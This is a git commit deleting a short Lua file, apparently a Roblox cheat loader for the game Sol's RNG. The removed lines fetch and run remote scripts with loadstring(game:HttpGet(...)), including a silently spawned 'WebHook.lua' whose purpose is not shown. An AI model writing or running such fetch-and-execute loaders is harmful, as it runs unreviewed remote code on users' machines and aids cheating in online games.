0e322ba0279a5ef5f11b9d3fe459e6532d772c1a
XiaoYunUwU <id_09128616@foxmail.com>
2026-05-02 14:01:33 +0800

    Delete Games/sols-RNG.lua

--- Games/sols-RNG.lua
+++
@@ -1,6 +0,0 @@
-task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaoYunUwU/Scripts/main/WebHook.lua"))("分支")
-end)
-shared.spacing = 1
-shared.toggled = true
-loadstring(game:HttpGet("https://raw.githubusercontent.com/123hubd7gh/123hubd7gh/main/Sol.lua"))()
